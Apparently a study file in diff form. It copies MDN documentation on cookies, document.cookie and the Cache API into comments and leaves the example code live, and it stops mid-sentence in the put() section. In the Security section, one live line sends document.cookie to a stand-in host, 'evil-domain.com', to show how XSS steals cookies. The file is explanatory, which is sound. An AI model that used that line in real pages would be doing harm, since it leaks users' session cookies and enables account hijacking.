+// site. This enables valid non-tracking 
+// uses of third-party cookies to 
+// continue working in browsers that 
+// do not allow cookies to be used 
+// for third-party tracking.
+
+
+// Cookie-related regulations
+// Legislation or regulations that 
+// cover the use of cookies include:
+
+// The General Data Privacy 
+// Regulation (GDPR) in the European Union
+// The ePrivacy Directive in the EU
+
+// The California Consumer Privacy Act
+// These regulations have global reach. 
+// They apply to any site on the World 
+// Wide Web that users from these 
+// jurisdictions access (the EU and 
+// California, with the caveat that 
+// California's law applies only to 
+// entities with gross revenue over 
+// 25 million USD, among things).
+
+// These regulations include requirements such as:
+
+// Notifying users that your site uses cookies.
+// Allowing users to opt out of 
+// receiving some or all cookies.
+// Allowing users to use the bulk 
+// of your service without receiving cookies.
+// There may be other regulations 
+// that govern the use of cookies 
+// in your locality. The burden is 
+// on you to know and comply with 
+// these regulations. There are 
+// companies that offer "cookie banner" 
+// code that helps you comply with 
+// these regulations.
+
+// Other ways to store information in the browser
+// Another approach to storing data in 
+// the browser is the Web Storage API. 
+// The window.sessionStorage and 
+// window.localStorage properties 
+// correspond to session and permanent 
+// cookies in duration, but have larger 
+// storage limits than cookies, and are 
+// never sent to a server. More structured 
+// and larger amounts of data can be 
+// stored using the IndexedDB API, 
+// or a library built on it.
+
+// There are some techniques designed 
+// to recreate cookies after they're 
+// deleted. These are known as "zombie" 
+// cookies. These techniques violate 
+// the principles of user privacy and 
+// user control, may violate data 
+// privacy regulations, and could 
+// expose a website using them to 
+// legal liability.
+
+console.log("Document: cookie property")
+
+// Document: cookie property
+// The Document property cookie lets you read and write 
+// cookies associated with the document. It serves as 
+// a getter and setter for the actual values of the cookies.
+
+// Syntax
+// Read all cookies accessible from this location
+allCookies = document.cookie;
+// In the code above allCookies is a string containing 
+// a semicolon-separated list of all cookies (i.e. key=value pairs). 
+// Note that each key and value may be surrounded by whitespace 
+// (space and tab characters): in fact, RFC 6265 mandates a single 
+// space after each semicolon, but some user agents may not abide by this.
+
+// Write a new cookie
+document.cookie = newCookie;
+// In the code above, newCookie is a string of form key=value, 
+// specifying the cookie to set/update. Note that you can only 
+// set/update a single cookie at a time using this method. Consider also that:
+
+// Any of the following cookie attribute values can optionally follow 
+// the key-value pair, each preceded by a semicolon separator:
+;domain=domain (e.g., example.com or subdomain.example.com): The host to which the cookie will be sent. If not specified, this defaults to the host portion of the current document location and the cookie is not available on subdomains. If a domain is specified, subdomains are always included. Contrary to earlier specifications, leading dots in domain names are ignored, but browsers may decline to set the cookie containing such dots.
+// Note: The domain must match the domain of the JavaScript origin. 
+// Setting cookies to foreign domains will be silently ignored.
+
+// ;expires=date-in-GMTString-format: The expiry date of the cookie. 
+// If neither expires nor max-age is specified, it will expire at the end of session.
+// Warning: When user privacy is a concern, it's important that any web app 
+// implementation invalidate cookie data after a certain timeout instead 
+// of relying on the browser to do it. Many browsers let users specify 
+// that cookies should never expire, which is not necessarily safe.
+
+// See Date.toUTCString() for help formatting this value.
+// ;max-age=max-age-in-seconds: The maximum age of the cookie in seconds (e.g., 60*60*24*365 or 31536000 for a year).
+// ;partitioned: Indicates that the cookie should be stored using partitioned storage. See Cookies Having Independent Partitioned State (CHIPS) for more details.
+// ;path=path: The value of the cookie's Path attribute.
+// ;samesite: SameSite prevents the browser from sending this cookie along with cross-site requests. Possible values are lax, strict or none.
+// The lax value will send the cookie for all same-site requests and top-level navigation GET requests. This is sufficient for user tracking, but it will prevent many Cross-Site Request Forgery (CSRF) attacks. This is the default value in modern browsers.
+// The strict value will prevent the cookie from being sent by the browser to the target site in all cross-site browsing contexts, even when following a regular link.
+// The none value explicitly states no restrictions will be applied. The cookie will be sent in all requests—both cross-site and same-site.
+// ;secure: Specifies that the cookie should only be transmitted over a secure protocol.
+// The cookie value string can use encodeURIComponent() to ensure that the string does not contain any commas, semicolons, or whitespace (which are disallowed in cookie values).
+// Some user agent implementations support the following cookie prefixes:
+// __Secure- Signals to the browser that it should only include the cookie in requests transmitted over a secure channel.
+// __Host- Signals to the browser that in addition to the restriction to only use the cookie from a secure origin, the scope of the cookie is limited to a path attribute passed down by the server. If the server omits the path attribute the "directory" of the request URI is used. It also signals that the domain attribute must not be present, which prevents the cookie from being sent to other domains. For Chrome the path attribute must always be the origin.
+// Note: The dash is considered part of the prefix.
+
+// Note: These flags are only settable with the secure attribute.
+
+// Note: As you can see from the code above, document.cookie is an accessor 
+// property with native setter and getter functions, and consequently is not 
+// a data property with a value: what you write is not the same as what you read, 
+// everything is always mediated by the JavaScript interpreter.
+
+// Examples
+// Example 1: Simple usage
+// Note that we are setting `SameSite=None;` in this example because the example
+// needs to work cross-origin.
+// It is more common not to set the `SameSite` attribute, which results in the default,
+// and more secure, value of `SameSite=Lax;`
+document.cookie = "name=oeschger; SameSite=None; Secure";
+document.cookie = "favorite_food=tripe; SameSite=None; Secure";
+
+function showCookies() {
+  const output = document.getElementById("cookies");
+  output.textContent = `> ${document.cookie}`;
+}
+
+function clearOutputCookies() {
+  const output = document.getElementById("cookies");
+  output.textContent = "";
+}
+// HTML
+// Play
+// Copy to Clipboard
+  // <button onclick="showCookies()">Show cookies</button>
+  // <button onclick="clearOutputCookies()">Clear</button>
+  // <div>
+  //   <code id="cookies"></code>
+  // </div>
+// Play
+
+// Example 2: Get a sample cookie named test2
+// Note that we are setting `SameSite=None;` in this example because the example
+// needs to work cross-origin.
+// It is more common not to set the `SameSite` attribute, which results in the default,
+// and more secure, value of `SameSite=Lax;`
+document.cookie = "test1=Hello; SameSite=None; Secure";
+document.cookie = "test2=World; SameSite=None; Secure";
+
+const cookieValue = document.cookie
+  .split("; ")
+  .find((row) => row.startsWith("test2="))
+  ?.split("=")[1];
+
+function showCookieValue() {
+  const output = document.getElementById("cookie-value");
+  output.textContent = `> ${cookieValue}`;
+}
+
+function clearOutputCookieValue() {
+  const output = document.getElementById("cookie-value");
+  output.textContent = "";
+}
+// HTML
+// Play
+// Copy to Clipboard
+      // <button onclick="showCookieValue()">Show cookie value</button>
+
+      // <button onclick="clearOutputCookieValue()">Clear</button>
+
+      // <div>
+      //   <code id="cookie-value"></code>
+      // </div>
+// Play
+
+// Example 3: Do something only once
+// In order to use the following code, please replace all occurrences of the 
+// word doSomethingOnlyOnce (the name of the cookie) with a custom name.
+
+function doOnce() {
+  if (
+    !document.cookie
+      .split("; ")
+      .find((row) => row.startsWith("doSomethingOnlyOnce"))
+  ) {
+    // Note that we are setting `SameSite=None;` in this example because the example
+    // needs to work cross-origin.
+    // It is more common not to set the `SameSite` attribute, which results in the default,
+    // and more secure, value of `SameSite=Lax;`
+    document.cookie =
+      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";
+
+    const output = document.getElementById("do-once");
+    output.textContent = "> Do something here!";
+  }
+}
+
+function clearOutputDoOnce() {
+  const output = document.getElementById("do-once");
+  output.textContent = "";
+}
+// HTML
+// Play
+// Copy to Clipboard
+      // <button onclick="doOnce()">Only do something once</button>
+
+      // <button onclick="clearOutputDoOnce()">Clear</button>
+
+      // <div>
+      //   <code id="do-once"></code>
+      // </div>
+// Play
+
+// Example 4: Reset the previous cookie
+function resetOnce() {
+  // Note that we are setting `SameSite=None;` in this example because the example
+  // needs to work cross-origin.
+  // It is more common not to set the `SameSite` attribute, which results in the default,
+  // and more secure, value of `SameSite=Lax;`
+  document.cookie =
+    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";
+
+  const output = document.getElementById("reset-once");
+  output.textContent = "> Reset!";
+}
+
+function clearOutputResetOnce() {
+  const output = document.getElementById("reset-once");
+  output.textContent = "";
+}
+// HTML
+// Play
+// Copy to Clipboard
+        // <button onclick="resetOnce()">Reset only once cookie</button>
+
+        // <button onclick="clearOutputResetOnce()">Clear</button>
+
+        // <div>
+        //   <code id="reset-once"></code>
+        // </div>
+// Play
+
+// Example 5: Check a cookie existence
+// Note that we are setting `SameSite=None;` in this example because the example
+// needs to work cross-origin.
+// It is more common not to set the `SameSite` attribute, which results in the default,
+// and more secure, value of `SameSite=Lax;`
+document.cookie = "reader=1; SameSite=None; Secure";
+
+function checkACookieExists() {
+  if (
+    document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
+  ) {
+    const output = document.getElementById("a-cookie-existence");
+    output.textContent = '> The cookie "reader" exists';
+  }
+}
+
+function clearOutputACookieExists() {
+  const output = document.getElementById("a-cookie-existence");
+  output.textContent = "";
+}
+// HTML
+// Play
+// Copy to Clipboard
+    // <button onclick="checkACookieExists()">Check a cookie exists</button>
+
+    // <button onclick="clearOutputACookieExists()">Clear</button>
+
+    // <div>
+    //   <code id="a-cookie-existence"></code>
+    // </div>
+// Play
+
+// Example 6: Check that a cookie has a specific value
+function checkCookieHasASpecificValue() {
+  if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
+    const output = document.getElementById("a-specific-value-of-the-cookie");
+    output.textContent = '> The cookie "reader" has a value of "1"';
+  }
+}
+
+function clearASpecificValueOfTheCookie() {
+  const output = document.getElementById("a-specific-value-of-the-cookie");
+  output.textContent = "";
+}
+// HTML
+// Play
+// Copy to Clipboard
+        // <button onclick="checkCookieHasASpecificValue()">
+        //   Check that a cookie has a specific value
+        // </button>
+
+        // <button onclick="clearASpecificValueOfTheCookie()">Clear</button>
+
+        // <div>
+        //   <code id="a-specific-value-of-the-cookie"></code>
+        // </div>
+// Play
+
+// Security
+// It is important to note that the path attribute does not protect against 
+// unauthorized reading of the cookie from a different path. It can be easily 
+// bypassed using the DOM, for example by creating a hidden <iframe> element 
+// with the path of the cookie, then accessing this iframe's 
+// contentDocument.cookie property. The only way to protect the cookie is by 
+// using a different domain or subdomain, due to the same origin policy.
+
+// Cookies are often used in web applications to identify a user and their 
+// authenticated session. Stealing a cookie from a web application leads to 
+// hijacking the authenticated user's session. Common ways to steal cookies 
+// include using social engineering or by exploiting a cross-site scripting (XSS) 
+// vulnerability in the application -
+
+// JS
+// Copy to Clipboard
+new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
+// The HTTPOnly cookie attribute can help to mitigate this attack by preventing 
+// access to cookie value through JavaScript. Read more about Cookies and Security.
+
+// Notes
+// Starting with Firefox 2, a better mechanism for client-side storage is available - WHATWG DOM Storage.
+// You can delete a cookie by updating its expiration time to zero.
+// Keep in mind that the more cookies you have, the more data will be transferred between the server and the client for each request. This will make each request slower. It is highly recommended for you to use WHATWG DOM Storage if you are going to keep "client-only" data.
+// RFC 2965 (Section 5.3, "Implementation Limits") specifies that there should be no maximum length of a cookie's key or value size, and encourages implementations to support arbitrarily large cookies. Each browser's implementation maximum will necessarily be different, so consult individual browser documentation.
+// The reason for the syntax of the document.cookie accessor property is due to the client-server nature of cookies, which differs from other client-client storage methods (like, for instance, localStorage):
+
+// The server tells the client to store a cookie
+// BASH
+// Copy to Clipboard
+// HTTP/1.0 200 OK
+// Content-type: text/html
+// Set-Cookie: cookie_name1=cookie_value1
+// Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT
+
+// [content of the page here]
+// The client sends back to the server its cookies previously stored
+// BASH
+// Copy to Clipboard
+// GET /sample_page.html HTTP/1.1
+// Host: www.example.org
+// Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
+// Accept: */*
+
+// cache (mdn)
+
+
+// Cache
+// The Cache interface provides 
+// a persistent storage mechanism 
+// for Request / Response object 
+// pairs that are cached in long 
+// lived memory. How long a Cache 
+// object lives is browser dependent, 
+// but a single origin's scripts can 
+// typically rely on the presence of 
+// a previously populated Cache object. 
+// Note that the Cache interface is 
+// exposed to windowed scopes as well
+//  as workers. You don't have to use
+//  it in conjunction with service workers, 
+// even though it is defined in the 
+// service worker spec.
+
+// An origin can have multiple, named 
+// Cache objects. You are responsible 
+// for implementing how your script (e.g. 
+// in a ServiceWorker) handles Cache updates.
+//  Items in a Cache do not get updated 
+// unless explicitly requested; they 
+// don't expire unless deleted. Use 
+// CacheStorage.open() to open a 
+// specific named Cache object and 
+// then call any of the Cache methods 
+// to maintain the Cache.
+
+// You are also responsible for 
+// periodically purging cache entries. 
+// Each browser has a hard limit on 
+// the amount of cache storage that 
+// a given origin can use. Cache quota 
+// usage estimates are available via 
+// the StorageManager.estimate() method. 
+// The browser does its best to manage 
+// disk space, but it may delete the 
+// Cache storage for an origin. The 
+// browser will generally delete all 
+// of the data for an origin or none 
+// of the data for an origin. Make 
+// sure to version caches by name 
+// and use the caches only from the 
+// version of the script that they 
+// can safely operate on. See Deleting 
+// old caches for more information.
+
+// Note: The key matching algorithm 
+// depends on the VARY header in the 
+// value. So matching a new key requires 
+// looking at both key and value for 
+// entries in the Cache object.
+
+// Note: The caching API doesn't 
+// honor HTTP caching headers.
+
+// Note: This feature is available in Web Workers
+
+// Secure context: This feature is 
+// available only in secure contexts 
+// (HTTPS), in some or all supporting browsers.
+
+// Instance methods
+Cache.match(request, options)
+// Returns a Promise that resolves to 
+// the response associated with the 
+// first matching request in the Cache object.
+
+Cache.matchAll(request, options)
+// Returns a Promise that resolves to 
+// an array of all matching responses 
+// in the Cache object.
+
+Cache.add(request)
+// Takes a URL, retrieves it and adds 
+// the resulting response object to 
+// the given cache. This is functionally
+//  equivalent to calling fetch(), 
+// then using put() to add the 
+// results to the cache.
+
+Cache.addAll(requests)
+// Takes an array of URLs, retrieves 
+// them, and adds the resulting 
+// response objects to the given cache.
+
+Cache.put(request, response)
+// Takes both a request and its 
+// response and adds it to the given cache.
+
+Cache.delete(request, options)
+// Finds the Cache entry whose key 
+// is the request, returning a Promise 
+// that resolves to true if a matching 
+// Cache entry is found and deleted. 
+// If no Cache entry is found, the 
+// promise resolves to false.
+
+Cache.keys(request, options)
+// Returns a Promise that resolves 
+// to an array of Cache keys.
+
+// Examples
+// This code snippet is from the 
+// service worker selective caching 
+// sample. (see selective caching live) 
+// The code uses CacheStorage.open() to 
+// open any Cache objects with a 
+// Content-Type header that starts with font/.
+
+// The code then uses Cache.match() to 
+// see if there's already a matching font 
+// in the cache, and if so, returns it. If 
+// there isn't a matching font, the code 
+// fetches the font from the network and 
+// uses Cache.put() to cache the fetched resource.
+
+// The code handles exceptions thrown from 
+// the fetch() operation. Note that an HTTP 
+// error response (e.g., 404) will not trigger 
+// an exception. It will return a normal 
+// response object that has the appropriate 
+// error code.
+
+// The code snippet also shows a best 
+// practice for versioning caches used 
+// by the service worker. Though there's 
+// only one cache in this example, the 
+// same approach can be used for multiple
+//  caches. It maps a shorthand identifier
+//  for a cache to a specific, versioned
+//  cache name. The code also deletes all
+//  caches that aren't named in CURRENT_CACHES.
+
+// In the code example, caches is a 
+// property of the ServiceWorkerGlobalScope. 
+// It holds the CacheStorage object, by 
+// which it can access the CacheStorage interface.
+
+// Note: In Chrome, visit 
+// chrome://inspect/#service-workers 
+// and click on the "inspect" link 
+// below the registered service worker 
+// to view logging statements for the 
+// various actions the service-worker.js 
+// script is performing.
+
+// JS
+// Copy to Clipboard
+const CACHE_VERSION = 1;
+const CURRENT_CACHES = {
+  font: `font-cache-v${CACHE_VERSION}`,
+};
+
+self.addEventListener("activate", (event) => {
+  // Delete all caches that aren't named in CURRENT_CACHES.
+  // While there is only one cache in this example, the same logic
+  // will handle the case where there are multiple versioned caches.
+  const expectedCacheNamesSet = new Set(Object.values(CURRENT_CACHES));
+  event.waitUntil(
+    caches.keys().then((cacheNames) =>
+      Promise.all(
+        cacheNames.map((cacheName) => {
+          if (!expectedCacheNamesSet.has(cacheName)) {
+            // If this cache name isn't present in the set of
+            // "expected" cache names, then delete it.
+            console.log("Deleting out of date cache:", cacheName);
+            return caches.delete(cacheName);
+          }
+        }),
+      ),
+    ),
+  );
+});
+
+self.addEventListener("fetch", (event) => {
+  console.log("Handling fetch event for", event.request.url);
+
+  event.respondWith(
+    caches.open(CURRENT_CACHES.font).then((cache) => {
+      return cache
+        .match(event.request)
+        .then((response) => {
+          if (response) {
+            // If there is an entry in the cache for event.request,
+            // then response will be defined and we can just return it.
+            // Note that in this example, only font resources are cached.
+            console.log(" Found response in cache:", response);
+
+            return response;
+          }
+
+          // Otherwise, if there is no entry in the cache for event.request,
+          // response will be undefined, and we need to fetch() the resource.
+          console.log(
+            " No response for %s found in cache. About to fetch " +
+              "from network…",
+            event.request.url,
+          );
+
+          // We call .clone() on the request since we might use it
+          // in a call to cache.put() later on.
+          // Both fetch() and cache.put() "consume" the request,
+          // so we need to make a copy.
+          // (see https://developer.mozilla.org/en-US/docs/Web/API/Request/clone)
+          return fetch(event.request.clone()).then((response) => {
+            console.log(
+              "  Response for %s from network is: %O",
+              event.request.url,
+              response,
+            );
+
+            if (
+              response.status < 400 &&
+              response.headers.has("content-type") &&
+              response.headers.get("content-type").match(/^font\//i)
+            ) {
+              // This avoids caching responses that we know are errors
+              // (i.e. HTTP status code of 4xx or 5xx).
+              // We also only want to cache responses that correspond
+              // to fonts, i.e. have a Content-Type response header that
+              // starts with "font/".
+              // Note that for opaque filtered responses
+              // https://fetch.spec.whatwg.org/#concept-filtered-response-opaque
+              // we can't access to the response headers, so this check will
+              // always fail and the font won't be cached.
+              // All of the Google Web Fonts are served from a domain that
+              // supports CORS, so that isn't an issue here.
+              // It is something to keep in mind if you're attempting
+              // to cache other resources from a cross-origin
+              // domain that doesn't support CORS, though!
+              console.log("  Caching the response to", event.request.url);
+              // We call .clone() on the response to save a copy of it
+              // to the cache. By doing so, we get to keep the original
+              // response object which we will return back to the controlled
+              // page.
+              // https://developer.mozilla.org/en-US/docs/Web/API/Request/clone
+              cache.put(event.request, response.clone());
+            } else {
+              console.log("  Not caching the response to", event.request.url);
+            }
+
+            // Return the original response object, which will be used to
+            // fulfill the resource request.
+            return response;
+          });
+        })
+        .catch((error) => {
+          // This catch() will handle exceptions that arise from the match()
+          // or fetch() operations.
+          // Note that a HTTP error response (e.g. 404) will NOT trigger
+          // an exception.
+          // It will return a normal response object that has the appropriate
+          // error code set.
+          console.error("  Error in fetch handler:", error);
+
+          throw error;
+        });
+    }),
+  );
+});
+// Cookies and Cache objects
+// The Fetch API requires Set-Cookie headers 
+// to be stripped before returning a Response
+//  object from fetch(). So a Response 
+// stored in a Cache won't contain 
+// Set-Cookie headers, and therefore 
+// won't cause any cookies to be stored.
+
+// cache instance methds
+// Cache: add() method
+// The add() method of the Cache interface 
+// takes a URL, retrieves it, and adds the 
+// resulting response object to the given cache.
+
+// The add() method is functionally 
+// equivalent to the following:
+
+// JS
+// Copy to Clipboard
+fetch(url).then((response) => {
+  if (!response.ok) {
+    throw new TypeError("bad response status");
+  }
+  return cache.add(url);
+});
+// For more complex operations, 
+// you'll need to use Cache.put() directly.
+
+// Note: add() will overwrite any 
+// key/value pair previously stored 
+// in the cache that matches the request.
+
+// Syntax
+// JS
+// Copy to Clipboard
+add(request)
+// Parameters
+// request
+// A request for the resource you want 
+// to add to the cache. This can be a 
+// Request object or a URL.
+
+// This parameter is used as a 
+// parameter to the Request() 
+// constructor, so URLs follow the 
+// same rules as for that constructor. 
+// In particular, URLs may be relative 
+// to the base URL, which is the document's 
+// baseURI in a window context, or 
+// WorkerGlobalScope.location in a worker context.
+
+// Return value
+// A Promise that resolves with undefined.
+
+// Exceptions
+// TypeError
+// The URL scheme is not http or https.
+
+// The Response status is not in the 
+// 200 range (i.e., not a successful response.)
+//  This occurs if the request does not return 
+// successfully, but also if the request is a 
+// cross-origin no-cors request (in which case 
+// the reported status is always 0.)
+
+// Examples
+// This code block waits for an InstallEvent 
+// to fire, then calls waitUntil() to handle 
+// the install process for the app. This 
+// consists of calling CacheStorage.open 
+// to create a new cache, then using 
+// Cache.add to add an asset to it.
+
+// JS
+// Copy to Clipboard
+this.addEventListener("install", (event) => {
+  event.waitUntil(caches.open("v1").then((cache) => cache.add("/index.html")));
+});
+
+// Cache: addAll() method
+// The addAll() method of the Cache 
+// interface takes an array of URLs, 
+// retrieves them, and adds the resulting
+//  response objects to the given cache. 
+// The request objects created during 
+// retrieval become keys to the stored 
+// response operations.
+
+// Note: addAll() will overwrite any 
+// key/value pairs previously stored 
+// in the cache that match the request, 
+// but will fail if a resulting put() 
+// operation would overwrite a previous 
+// cache entry stored by the same addAll() method.
+
+// Syntax
+// JS
+// Copy to Clipboard
+addAll(requests)
+// Parameters
+// requests
+// An array of requests for the resources 
+// you want to add to the cache. These
+//  can be Request objects or URLs.
+
+// These requests are used as parameters 
+// to the Request() constructor, so URLs 
+// follow the same rules as for that 
+// constructor. In particular, URLs may be 
+// relative to the base URL, which is the 
+// document's baseURI in a window context, 
+// or WorkerGlobalScope.location in a worker context.
+
+// Return value
+// A Promise that resolves with undefined.
+
+// Exceptions
+// TypeError
+// The URL scheme is not http or https.
+
+// The Response status is not in the 200
+//  range (i.e., not a successful response.) 
+// This occurs if the request does not return 
+// successfully, but also if the request is a 
+// cross-origin no-cors request (in which 
+// case the reported status is always 0.)
+
+// Examples
+// This code block waits for an InstallEvent 
+// to fire, then runs waitUntil() to handle 
+// the install process for the app. This 
+// consists of calling CacheStorage.open 
+// to create a new cache, then using 
+// addAll() to add a series of assets to it.
+
+// JS
+// Copy to Clipboard
+this.addEventListener("install", (event) => {
+  event.waitUntil(
+    caches
+      .open("v1")
+      .then((cache) =>
+        cache.addAll([
+          "/",
+          "/index.html",
+          "/style.css",
+          "/app.js",
+          "/image-list.js",
+          "/star-wars-logo.jpg",
+          "/gallery/",
+          "/gallery/bountyHunters.jpg",
+          "/gallery/myLittleVader.jpg",
+          "/gallery/snowTroopers.jpg",
+        ]),
+      ),
+  );
+});
+
+// Cache: delete() method
+// The delete() method of the Cache 
+// interface finds the Cache entry 
+// whose key is the request, and if 
+// found, deletes the Cache entry and 
+// returns a Promise that resolves to 
+// true. If no Cache entry is found, 
+// it resolves to false.
+
+// Syntax
+// JS
+// Copy to Clipboard
+delete(request)
+delete(request, options)
+// Parameters
+// request
+// The Request you are looking 
+// to delete. This can be a Request 
+// object or a URL.
+
+// options Optional
+// An object whose properties control 
+// how matching is done in the delete
+//  operation. The available options are:
+
+// ignoreSearch
+// A boolean value that specifies 
+// whether the matching process should 
+// ignore the query string in the URL. 
+// If set to true, the ?value=bar part
+//  of http://foo.com/?value=bar would 
+// be ignored when performing a match. 
+// It defaults to false.
+
+// ignoreMethod
+// A boolean value that, when set to true, 
+// prevents matching operations from validating 
+// the Request HTTP method (normally only GET 
+// and HEAD are allowed.) It defaults to false.
+
+// ignoreVary
+// A boolean value that, when set to true, 
+// tells the matching operation not to perform 
+// VARY header matching. In other words, if the 
+// URL matches you will get a match regardless 
+// of whether the Response object has a VARY 
+// header. It defaults to false.
+
+// cacheName
+// A string that represents a specific cache 
+// to search within. Note that this option 
+// is ignored by Cache.delete().
+
+// Return value
+// a Promise that resolves to true if the 
+// cache entry is deleted, or false otherwise.
+
+// Examples
+// JS
+// Copy to Clipboard
+caches.open("v1").then((cache) => {
+  cache.delete("/images/image.png").then((response) => {
+    someUIUpdateFunction();
+  });
+});
+
+// Cache: keys() method
+
+// The keys() method of the Cache 
+// interface returns a Promise that 
+// resolves to an array of Request 
+// objects representing the keys of the Cache.
+
+// The requests are returned in the 
+// same order that they were inserted.
+
+// Note: Requests with duplicate URLs 
+// but different headers can be returned 
+// if their responses have the VARY 
+// header set on them.
+
+// Syntax
+// JS
+// Copy to Clipboard
+keys()
+keys(request)
+keys(request, options)
+// Parameters
+// request Optional
+// The Request want to return, if a 
+// specific key is desired. This can 
+// be a Request object or a URL.
+
+// options Optional
+// An object whose properties control 
+// how matching is done in the keys 
+// operation. The available options are:
+
+// ignoreSearch
+// A boolean value that specifies whether 
+// the matching process should ignore the 
+// query string in the URL. If set to true, 
+// the ?value=bar part of http://foo.com/?value=bar 
+// would be ignored when performing a match. 
+// It defaults to false.
+
+// ignoreMethod
+// A boolean value that, when set to true, 
+// prevents matching operations from 
+// validating the Request HTTP method 
+// (normally only GET and HEAD are allowed.)
+//  It defaults to false.
+
+// ignoreVary
+// A boolean value that, when set to true, 
+// tells the matching operation not to perform
+//  VARY header matching. In other words, if
+//  the URL matches you will get a match 
+// regardless of whether the Response
+//  object has a VARY header. It defaults to false.
+
+// cacheName
+// A string that represents a specific 
+// cache to search within. Note that 
+// this option is ignored by Cache.keys().
+
+// Return value
+// A Promise that resolves to an array of Request objects.
+
+// Examples
+// JS
+// Copy to Clipboard
+caches.open("v1").then((cache) => {
+  cache.keys().then((keys) => {
+    keys.forEach((request, index, array) => {
+      cache.delete(request);
+    });
+  });
+});
+
+// Cache: match() method
+// The match() method of the Cache
+//  interface returns a Promise 
+// that resolves to the Response 
+// associated with the first matching
+//  request in the Cache object. If 
+// no match is found, the Promise 
+// resolves to undefined.
+
+// Syntax
+// JS
+// Copy to Clipboard
+match(request)
+match(request, options)
+// Parameters
+// request
+// The Request for which you are 
+// attempting to find responses 
+// in the Cache. This can be a 
+// Request object or a URL string.
+
+// options Optional
+// An object that sets options for 
+// the match operation. The available options are:
+
+// ignoreSearch
+// A boolean value that specifies 
+// whether to ignore the query string 
+// in the URL. For example, if set to 
+// true the ?value=bar part of
+//  http://foo.com/?value=bar would 
+// be ignored when performing a match.
+//  It defaults to false.
+
+// ignoreMethod
+// A boolean value that, when set to 
+// true, prevents matching operations 
+// from validating the Request http 
+// method (normally only GET and HEAD 
+// are allowed.) It defaults to false.
+
+// ignoreVary
+// A boolean value that when set to 
+// true tells the matching operation 
+// not to perform VARY header matching 
+// — i.e. if the URL matches you will 
+// get a match regardless of whether 
+// the Response object has a VARY header.
+//  It defaults to false.
+
+// Return value
+// A Promise that resolves to the first 
+// Response that matches the request or 
+// to undefined if no match is found.
+
+// Note: Cache.match() is basically 
+// identical to Cache.matchAll(), except
+//  that rather than resolving with an 
+// array of all matching responses, it
+//  resolves with the first matching 
+// response only (that is, response[0]).
+
+// Examples
+// This example is taken from the custom
+//  offline page example (live demo). It 
+// uses a cache to supply selected data 
+// when a request fails. A catch() clause 
+// is triggered when the call to fetch() 
+// throws an exception. Inside the catch() 
+// clause, match() is used to return the 
+// correct response.
+
+// In this example, only HTML documents 
+// retrieved with the GET HTTP verb will 
+// be cached. If our if () condition is 
+// false, then this fetch handler won't 
+// intercept the request. If there are 
+// any other fetch handlers registered,
+//  they will get a chance to call 
+// event.respondWith(). If no fetch 
+// handlers call event.respondWith(), 
+// the request will be handled by the
+//  browser as if there were no service
+//  worker involvement. If fetch() 
+// returns a valid HTTP response with an 
+// response code in the 4xx or 5xx range,
+//  the catch() will NOT be called.
+
+// JS
+// Copy to Clipboard
+self.addEventListener("fetch", (event) => {
+  // We only want to call event.respondWith() if this is a GET request for an HTML document.
+  if (
+    event.request.method === "GET" &&
+    event.request.headers.get("accept").includes("text/html")
+  ) {
+    console.log("Handling fetch event for", event.request.url);
+    event.respondWith(
+      fetch(event.request).catch((e) => {
+        console.error("Fetch failed; returning offline page instead.", e);
+        return caches
+          .open(OFFLINE_CACHE)
+          .then((cache) => cache.match(OFFLINE_URL));
+      }),
+    );
+  }
+});
+
+// Cache: matchAll() method
+// The matchAll() method of the Cache 
+// interface returns a Promise that 
+// resolves to an array of all 
+// matching responses in the Cache object.
+
+// Syntax
+// JS
+// Copy to Clipboard
+matchAll()
+matchAll(request)
+matchAll(request, options)
+// Parameters
+// request Optional
+// The Request for which you are 
+// attempting to find responses in 
+// the Cache. This can be a Request 
+// object or a URL. If this argument 
+// is omitted, you will get a copy of 
+// all responses in this cache.
+
+// options Optional
+// An options object allowing you to set 
+// specific control options for the 
+// matching performed. The available 
+// options are:
+
+// ignoreSearch
+// A boolean value that specifies 
+// whether the matching process 
+// should ignore the query string 
+// in the URL. If set to true, the 
+// ?value=bar part of http://foo.com/?value=bar 
+// would be ignored when performing a match.
+//  It defaults to false.
+
+// ignoreMethod
+// A boolean value that, when set to true,
+//  prevents matching operations from 
+// validating the Request http method 
+// (normally only GET and HEAD are allowed.) 
+// It defaults to false.
+
+// ignoreVary
+// A boolean value that when set to true 
+// tells the matching operation not to 
+// perform VARY header matching — i.e. 
+// if the URL matches you will get a match 
+// regardless of the Response object having 
+// a VARY header or not. It defaults to false.
+
+// Return value
+// A Promise that resolves to an array of 
+// all matching responses in the Cache object.
+
+// Note: Cache.match() is basically identical 
+// to Cache.matchAll(), except that rather 
+// than resolving with an array of all 
+// matching responses, it resolves with 
+// the first matching response only 
+// (that is, response[0]).
+
+// Examples
+// The following example retrieves all 
+// responses in the v1 cache matching the 
+// URL /, even including potential query 
+// parameters. By using { ignoreSearch: true },
+//  using matchAll would retrieve / as 
+// well as /?value=bar.
+
+// It then logs the number of matching responses.
+
+// JS
+// Copy to Clipboard
+caches.open("v1").then((cache) => {
+  cache.matchAll("/", { ignoreSearch: true }).then((responses) => {
+    console.log(`Found ${responses.length} matching responses`);
+  });
+});
+
+// Cache: put() method
+// The put() method of the Cache 
+// interface allows key/value 
+// pairs to be added to the 
+// current Cache object.
+
+// Often, you will just want to 
+// fetch() one or more requests, 
+// then add the result straight 
+// to your cache. In such cases 
+// you are better off using
+//  Cache.add()/Cache.addAll(), 
+// as they are shorthand functions 
+// for one or more of these operations.
+
+// JS
+// Copy to Clipboard
+fetch(url).then((response) => {
+  if (!response.ok) {
+    throw new TypeError("Bad response status");
+  }
+  return cache.put(url, response);
+});
+// Note: put() will overwrite any 
+// key/value pair previously stored 
+// in the cache that matches the request.
+
+// Note: Cache.add/Cache.addAll do 
+// not cache responses with
+//  Response.status values that 
+// are not in the 200 range, 
+// whereas Cache.put lets you 
+// store any request/response pair. 
+// As a result, Cache.add/Cache.addAll 
+// can't be used to store opaque 
+// responses, whereas Cache.put can.
+
+// Syntax
+// JS
+// Copy to Clipboard
+put(request, response)
+// Parameters
+// request
+// The Request object or URL that 
